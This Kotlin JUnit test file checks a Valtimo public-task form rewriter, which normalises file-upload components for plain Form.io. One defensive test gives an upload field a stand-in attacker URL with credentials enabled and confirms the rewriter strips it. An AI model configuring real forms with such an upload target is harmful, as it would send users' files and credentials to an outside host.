/*
 * Copyright 2026 Ritense BV, the Netherlands.
 *
 * Licensed under EUPL, Version 1.2 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * https://joinup.ec.europa.eu/collection/eupl/eupl-text-eupl-12
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" basis,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.ritense.valtimoplugins.publictask.service

import com.fasterxml.jackson.databind.JsonNode
import com.fasterxml.jackson.databind.node.ObjectNode
import com.ritense.form.domain.submission.formfield.UploadField
import com.ritense.valtimoplugins.publictask.BaseTest
import org.assertj.core.api.Assertions.assertThat
import org.junit.jupiter.api.Test
import org.junit.jupiter.params.ParameterizedTest
import org.junit.jupiter.params.provider.ValueSource

internal class PublicTaskFormRewriterTest : BaseTest() {
    @ParameterizedTest
    @ValueSource(strings = ["file", "valtimo-file", "documenten-api-file"])
    fun `every upload component Valtimo recognises is made renderable by plain Form io`(componentType: String) {
        val form = formWith("""{"key": "bijlagen", "type": "$componentType", "input": true}""")

        val rewritten = PublicTaskFormRewriter.rewriteUploadComponents(form)

        val component = rewritten.at("/components/0")
        assertThat(component.get("type").textValue()).isEqualTo("file")
        assertThat(component.get("storage").textValue()).isEqualTo("publicTask")
        assertThat(component.get("key").textValue()).isEqualTo("bijlagen")
    }

    @ParameterizedTest
    @ValueSource(strings = ["file", "valtimo-file", "documenten-api-file"])
    fun `a rewritten component is still an upload component to Valtimo, so its file is not stranded`(
        componentType: String,
    ) {
        val form = formWith("""{"key": "bijlagen", "type": "$componentType", "input": true}""")

        val rewritten = PublicTaskFormRewriter.rewriteUploadComponents(form)

        // If the submission does not come back as something UploadField picks up, the file is stranded.
        val component = rewritten.at("/components/0") as ObjectNode
        assertThat(UploadField.isUploadComponent(component)).isTrue()
    }

    @Test
    fun `an upload component nested in a layout component is rewritten too`() {
        val form =
            formWith(
                """
                {
                  "key": "kolommen",
                  "type": "columns",
                  "columns": [
                    { "components": [ { "key": "bijlage", "type": "valtimo-file", "input": true } ] }
                  ]
                }
                """.trimIndent(),
            )

        val rewritten = PublicTaskFormRewriter.rewriteUploadComponents(form)

        assertThat(rewritten.at("/components/0/columns/0/components/0/type").textValue()).isEqualTo("file")
        assertThat(rewritten.at("/components/0/columns/0/components/0/storage").textValue()).isEqualTo("publicTask")
    }

    @Test
    fun `an upload component cannot keep an upload target of its own`() {
        val form =
            formWith(
                """
                {
                  "key": "bijlage",
                  "type": "file",
                  "input": true,
                  "storage": "url",
                  "url": "https://attacker.example.org/collect",
                  "options": "{\"withCredentials\": true}"
                }
                """.trimIndent(),
            )

        val rewritten = PublicTaskFormRewriter.rewriteUploadComponents(form)

        val component = rewritten.at("/components/0")
        assertThat(component.get("storage").textValue()).isEqualTo("publicTask")
        assertThat(component.has("url")).isFalse()
        assertThat(component.get("options")).isEqualTo(objectMapper.readTree("""{"componentKey": "bijlage"}"""))
    }

    @Test
    fun `an upload component tells the page which field a file was chosen in`() {
        val form = formWith("""{"key": "bijlage", "type": "valtimo-file", "input": true}""")

        val rewritten = PublicTaskFormRewriter.rewriteUploadComponents(form)

        assertThat(rewritten.at("/components/0/options/componentKey").textValue()).isEqualTo("bijlage")
    }

    @Test
    fun `the limits an upload field asks for survive the rewrite, because the server reads them back`() {
        val form =
            formWith(
                """
                {
                  "key": "bijlage",
                  "type": "valtimo-file",
                  "input": true,
                  "fileMaxSize": "2MB",
                  "filePattern": "application/pdf"
                }
                """.trimIndent(),
            )

        val rewritten = PublicTaskFormRewriter.rewriteUploadComponents(form)

        val component = rewritten.at("/components/0")
        assertThat(component.get("fileMaxSize").textValue()).isEqualTo("2MB")
        assertThat(component.get("filePattern").textValue()).isEqualTo("application/pdf")
    }

    @Test
    fun `an uploaded file is listed rather than offered back for download`() {
        val form = formWith("""{"key": "bijlage", "type": "file", "input": true, "image": true}""")

        val rewritten = PublicTaskFormRewriter.rewriteUploadComponents(form)

        assertThat(rewritten.at("/components/0/uploadOnly").booleanValue()).isTrue()
        assertThat(rewritten.at("/components/0/image").booleanValue()).isFalse()
    }

    @Test
    fun `components that are not uploads are left exactly as they were`() {
        val form =
            formWith(
                """{"key": "naam", "type": "textfield", "input": true}""",
                """{"key": "toelichting", "type": "textarea", "input": true}""",
                """{"key": "uitleg", "type": "content", "input": false, "html": "<p>file</p>"}""",
            )

        val rewritten = PublicTaskFormRewriter.rewriteUploadComponents(form)

        assertThat(rewritten).isEqualTo(form)
    }

    @Test
    fun `the original form definition is not modified`() {
        val form = formWith("""{"key": "bijlage", "type": "valtimo-file", "input": true}""")
        val before = form.deepCopy<JsonNode>()

        PublicTaskFormRewriter.rewriteUploadComponents(form)

        assertThat(form).isEqualTo(before)
    }
}
